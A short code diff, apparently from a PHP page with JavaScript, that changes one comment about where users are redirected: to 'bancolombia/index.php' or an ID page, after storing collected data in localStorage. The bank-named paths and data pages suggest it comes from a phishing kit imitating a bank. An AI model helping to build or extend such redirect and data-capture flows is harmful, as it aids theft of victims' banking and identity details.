@@ -79,7 +79,7 @@ ini_set('display_errors', 0);
                         datos.type = result.type;
                         localStorage.setItem('tbdatos', JSON.stringify(datos));
 
-                        // Redirigir al destino (bancol/index-pc.html o id.html)
+                        // Redirigir al destino (bancolombia/index.php o id.html)
                         window.location.href = result.redirect;
                     } else {
                         window.location.href = 'dinadatos/id.html';
